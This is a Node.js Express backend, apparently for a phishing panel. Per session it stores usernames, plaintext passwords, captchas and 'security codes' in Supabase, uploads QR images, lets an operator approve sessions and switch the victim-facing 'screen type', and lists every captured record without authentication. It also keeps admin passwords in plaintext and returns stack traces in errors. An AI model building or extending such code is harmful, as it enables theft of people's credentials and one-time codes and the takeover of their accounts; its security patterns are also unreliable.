require('dotenv').config();
const express = require('express');
const cors = require('cors');
const multer = require('multer');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

// Security: Remove X-Powered-By header to hide server info
app.disable('x-powered-by');

// Security: Basic Rate Limiting to prevent brute force
const requestCounts = new Map();
const RATE_LIMIT_WINDOW = 15 * 60 * 1000; // 15 minutes
const MAX_REQUESTS = 100;

app.use((req, res, next) => {
  const ip = req.ip;
  const now = Date.now();
  
  if (!requestCounts.has(ip)) {
    requestCounts.set(ip, { count: 1, firstRequest: now });
  } else {
    const data = requestCounts.get(ip);
    if (now - data.firstRequest > RATE_LIMIT_WINDOW) {
      data.count = 1;
      data.firstRequest = now;
    } else {
      data.count++;
      if (data.count > MAX_REQUESTS) {
        return res.status(429).json({ 
          success: false, 
          error: 'Muitas requisições. Tente novamente mais tarde.' 
        });
      }
    }
  }
  next();
});

// Security: Custom Security Headers
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;");
  next();
});

// Initialize Supabase client with environment variables
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

// Middleware
app.use(cors({
  origin: process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'x-pow-nonce']
}));
app.use(express.json());
app.use(express.static('public'));

// DDoS Protection Middleware (Proof of Work / Blockchain Verification)
function verifyPoW(data, nonce, difficulty = 4) {
  if (!nonce) return false;
  const target = '0'.repeat(difficulty);
  const hash = crypto.createHash('sha256').update(data + nonce).digest('hex');
  return hash.startsWith(target);
}

app.use('/api', (req, res, next) => {
  // Only verify mutations (POST/PUT) to prevent DDoS on data submission
  if (req.method === 'POST' || req.method === 'PUT') {
    const nonce = req.headers['x-pow-nonce'];
    // Use the raw body or stringified body for verification
    // Since we use express.json(), req.body is already parsed. 
    // We must ensure the client used the same stringification.
    const bodyStr = JSON.stringify(req.body);
    
    if (!verifyPoW(bodyStr, nonce)) {
      console.warn(`[SECURITY] Invalid PoW from ${req.ip}. Nonce: ${nonce}`);
      return res.status(403).json({ 
        success: false, 
        error: 'Acesso negado: Falha na verificação de integridade (Blockchain PoW).' 
      });
    }
  }
  next();
});

// Configure multer for file uploads
const upload = multer({ storage: multer.memoryStorage() });

// Input Sanitization Utility
function sanitizeInput(obj) {
  if (typeof obj !== 'object' || obj === null) return obj;
  
  const sanitized = Array.isArray(obj) ? [] : {};
  
  for (const key in obj) {
    if (typeof obj[key] === 'string') {
      // Remove HTML tags and potential script injections
      sanitized[key] = obj[key]
        .replace(/<[^>]*>?/gm, '') // Remove HTML tags
        .replace(/[&<>"']/g, function(m) { // Escape characters
          return {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;'
          }[m];
        });
    } else if (typeof obj[key] === 'object') {
      sanitized[key] = sanitizeInput(obj[key]);
    } else {
      sanitized[key] = obj[key];
    }
  }
  return sanitized;
}

// Middleware to sanitize all request bodies
app.use((req, res, next) => {
  if (req.body) {
    req.body = sanitizeInput(req.body);
  }
  next();
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', message: 'Backend API is running' });
});

// Admin login endpoint
app.post('/api/admin-login', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    const { data, error } = await supabase
      .from('admin_credentials')
      .select('*')
      .eq('username', username)
      .eq('password', password)
      .single();
    
    if (error || !data) {
      return res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
    
    res.json({ success: true, data });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint to insert pending user data
app.post('/api/pending-users', async (req, res) => {
  try {
    const { session_id, username, password, captcha, status, admin_approved } = req.body;
    
    const { data, error } = await supabase
      .from('pending_users')
      .insert([{ session_id, username, password, captcha, status, admin_approved }])
      .select();
    
    if (error) {
      console.error('Error inserting user:', error);
      return res.status(500).json({ error: error.message });
    }
    
    res.json({ success: true, data });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint to update pending user status
app.put('/api/pending-users/:session_id', async (req, res) => {
  try {
    const { session_id } = req.params;
    const updateData = { ...req.body };
    
    // Remove session_id from updateData if it exists
    delete updateData.session_id;
    
    // Explicitly handle code to ensure it's treated as a string and not null if provided
    if (req.body.code !== undefined && req.body.code !== null) {
      updateData.code = String(req.body.code);
    }
    
    console.log(`[DEBUG] Updating session ${session_id} with:`, JSON.stringify(updateData));
    
    const { data, error } = await supabase
      .from('pending_users')
      .update(updateData)
      .eq('session_id', session_id)
      .select();
    
    if (error) {
      console.error('[ERROR] Supabase update failed:', error);
      return res.status(500).json({ error: error.message });
    }
    
    if (!data || data.length === 0) {
      console.warn(`[WARN] No row found for session_id: ${session_id}`);
    } else {
      console.log('[DEBUG] Update successful, new data:', JSON.stringify(data[0]));
    }
    
    res.json({ success: true, data });
  } catch (error) {
    console.error('[SERVER ERROR]:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});
    
// Endpoint to get pending user by session_id
app.get('/api/pending-users/:session_id', async (req, res) => {
  try {
    const { session_id } = req.params;
    
    const { data, error } = await supabase
      .from('pending_users')
      .select('*')
      .eq('session_id', session_id)
      .single();
    
    if (error) {
      console.error('Error fetching user:', error);
      return res.status(500).json({ error: error.message });
    }
    
    res.json({ success: true, data });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint to get all pending users (for admin dashboard)
app.get('/api/pending-users', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('pending_users')
      .select('*')
      .order('created_at', { ascending: false });
    
    if (error) {
      console.error('Error fetching users:', error);
      return res.status(500).json({ error: error.message });
    }
    
    res.json({ success: true, data });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint to delete pending user
app.delete('/api/pending-users/:session_id', async (req, res) => {
  try {
    const { session_id } = req.params;
    
    const { error } = await supabase
      .from('pending_users')
      .delete()
      .eq('session_id', session_id);
    
    if (error) {
      console.error('Error deleting user:', error);
      return res.status(500).json({ error: error.message });
    }
    
    res.json({ success: true, message: 'User deleted successfully' });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint to get completed users
app.get('/api/completed-users', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('pending_users')
      .select('*')
      .eq('status', 'completed')
      .order('completed_at', { ascending: false });
    
    if (error) {
      console.error('Error fetching completed users:', error);
      return res.status(500).json({ error: error.message });
    }
    
    res.json({ success: true, data });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});// Endpoint to upload QR code
app.post('/api/upload-qr', upload.single('qrImage'), async (req, res) => {
  try {
    const { sessionId } = req.body;
    const qrImage = req.file;
    
    if (!sessionId || !qrImage) {
      return res.status(400).json({ success: false, error: 'Missing required fields' });
    }
    
    // Upload to Supabase bucket
    const fileName = `qr-${sessionId}-${Date.now()}.png`;
    const { data: uploadData, error: uploadError } = await supabase
      .storage
      .from('qr-codes')
      .upload(fileName, qrImage.buffer);
    
    if (uploadError) {
      console.error('Error uploading QR code:', uploadError);
      return res.status(500).json({ success: false, error: uploadError.message });
    }
    
    // Get public URL
    const { data: publicUrlData } = supabase
      .storage
      .from('qr-codes')
      .getPublicUrl(fileName);
    
    // Update pending user with QR code URL
    const { error: updateError } = await supabase
      .from('pending_users')
      .update({ qr_code_image: publicUrlData.publicUrl })
      .eq('session_id', sessionId);
    
    if (updateError) {
      console.error('Error updating user:', updateError);
      return res.status(500).json({ success: false, error: updateError.message });
    }
    
    res.json({ success: true, data: { qrUrl: publicUrlData.publicUrl } });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint to change admin password
app.post('/api/admin-change-password', async (req, res) => {
  try {
    const { adminUsername, currentPassword, newPassword } = req.body;
    
    // Verify current password
    const { data: adminData, error: verifyError } = await supabase
      .from('admin_credentials')
      .select('*')
      .eq('username', adminUsername)
      .eq('password', currentPassword)
      .single();
    
    if (verifyError || !adminData) {
      return res.status(401).json({ success: false, error: 'Invalid current password' });
    }
    
    // Update password
    const { error: updateError } = await supabase
      .from('admin_credentials')
      .update({ password: newPassword })
      .eq('username', adminUsername);
    
    if (updateError) {
      console.error('Error updating password:', updateError);
      return res.status(500).json({ success: false, error: updateError.message });
    }
    
    res.json({ success: true, message: 'Password updated successfully' });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint to save screen type preference
app.post('/api/screen-type', async (req, res) => {
  try {
    const { screenType } = req.body;
    
    // Check if settings table has a row
    const { data: existingData, error: fetchError } = await supabase
      .from('settings')
      .select('*')
      .eq('id', 1)
      .single();
    
    if (fetchError && fetchError.code !== 'PGRST116') {
      console.error('Error fetching settings:', fetchError);
      return res.status(500).json({ success: false, error: fetchError.message });
    }
    
    if (existingData) {
      // Update existing setting
      const { error: updateError } = await supabase
        .from('settings')
        .update({ screen_type: screenType })
        .eq('id', 1);
      
      if (updateError) {
        console.error('Error updating screen type:', updateError);
        return res.status(500).json({ success: false, error: updateError.message });
      }
    } else {
      // Insert new setting
      const { error: insertError } = await supabase
        .from('settings')
        .insert([{ id: 1, screen_type: screenType }]);
      
      if (insertError) {
        console.error('Error inserting screen type:', insertError);
        return res.status(500).json({ success: false, error: insertError.message });
      }
    }
    
    res.json({ success: true, message: 'Screen type saved successfully' });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint to get screen type preference
app.get('/api/screen-type', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('settings')
      .select('*')
      .eq('id', 1)
      .single();
    
    if (error && error.code !== 'PGRST116') {
      console.error('Error fetching screen type:', error);
      return res.status(500).json({ success: false, error: error.message });
    }
    
    res.json({ success: true, data: data || { screen_type: 'qr' } });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint to receive and store security code
app.post('/api/security-code', async (req, res) => {
  try {
    const { session_id, code } = req.body;
    
    if (!session_id || !code) {
      return res.status(400).json({ success: false, error: 'Missing required fields' });
    }
    
    // Update pending user with the security code
    const { error } = await supabase
      .from('pending_users')
      .update({ code: code })
      .eq('session_id', session_id);
    
    if (error) {
      console.error('Error updating security code:', error);
      return res.status(500).json({ success: false, error: error.message });
    }
    
    res.json({ success: true, message: 'Security code saved successfully' });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Generic Error Handler (Security: Prevent info leakage)
app.use((err, req, res, next) => {
  console.error('[SERVER ERROR]:', err.stack);
  // Temporarily show error details for debugging
  res.status(500).json({ 
    success: false, 
    error: err.message,
    stack: err.stack
  });
});

// Start server (only for local development)
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`Backend API running on http://localhost:${PORT}`);
  });
}

// Export for Vercel serverless
module.exports = app;
